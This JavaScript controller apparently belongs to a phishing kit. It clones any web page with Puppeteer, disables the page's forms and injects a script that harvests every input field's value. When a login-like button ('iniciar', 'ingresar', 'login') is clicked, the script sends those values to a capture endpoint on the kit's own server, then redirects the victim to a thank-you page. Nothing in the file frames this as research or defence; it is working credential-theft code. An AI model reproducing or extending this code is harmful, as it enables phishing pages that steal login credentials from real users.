// backend/src/controller/clone.controller.js
import puppeteer from 'puppeteer';
import fs from 'fs';
import path from 'path';

export const clonePage = async (req, res) => {
    try {
        const { name, url } = req.body;
        if (!name || !url) return res.status(400).json({ message: 'name y url requeridos' });

        const browser = await puppeteer.launch();
        const page = await browser.newPage();

        await page.goto(url, { waitUntil: 'networkidle2' });

        await page.evaluate(() => {
            const toAbsolute = (u) => new URL(u, location.href).href;

            document.querySelectorAll('link[href]').forEach((el) => {
                const href = el.getAttribute('href');
                if (href && !href.startsWith('http')) el.href = toAbsolute(href);
            });

            document.querySelectorAll('script[src]').forEach((el) => {
                const src = el.getAttribute('src');
                if (src && !src.startsWith('http')) el.src = toAbsolute(src);
            });

            document.querySelectorAll('img[src]').forEach((el) => {
                const src = el.getAttribute('src');
                if (src && !src.startsWith('http')) el.src = toAbsolute(src);
            });

            document.querySelectorAll('form').forEach((form) => {
                form.setAttribute('action', 'javascript:void(0)');
                form.setAttribute('onsubmit', 'return false');
            });

            const script = document.createElement('script');
            script.innerHTML = `
                function getCredenciales() {
                const inputs = document.querySelectorAll('input');
                const data = {};
                inputs.forEach(input => {
                    data[input.name || input.id || input.type] = input.value;
                });
                return data;
                }

                function enviarCredenciales() {
                    const data = getCredenciales();
                    fetch('http://localhost:3000/api/capture/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).catch(err => console.error('Error enviando credenciales:', err));
                }

                // Intenta enganchar el primer botón que diga "Iniciar sesión" o similar
                const posibleBoton = Array.from(document.querySelectorAll('button, input[type="submit"], input[type="button"]'))
                .find(btn => {
                    const texto = (btn.innerText || btn.value || '').toLowerCase();
                    return texto.includes('iniciar') || texto.includes('ingresar') || texto.includes('entrar') || texto.includes('login');
                });
                if (posibleBoton) {
                posibleBoton.addEventListener('click', () => {
                    enviarCredenciales();
                    setTimeout(() => {
                    window.location.href = '/gracias.html';
                    }, 1000);
                });
                }
            `;
            document.body.appendChild(script);
        });



        const html = await page.content();

        const folderPath = path.resolve(`../frontend/public/${name}`);
        fs.mkdirSync(folderPath, { recursive: true });
        fs.writeFileSync(`${folderPath}/index.html`, html);

        await browser.close();

        res.status(200).json({ message: `Página clonada como ${name}` });
    } catch (error) {
        console.error('Error al clonar página:', error);
        res.status(500).json({ message: 'Error al clonar página' });
    }
};
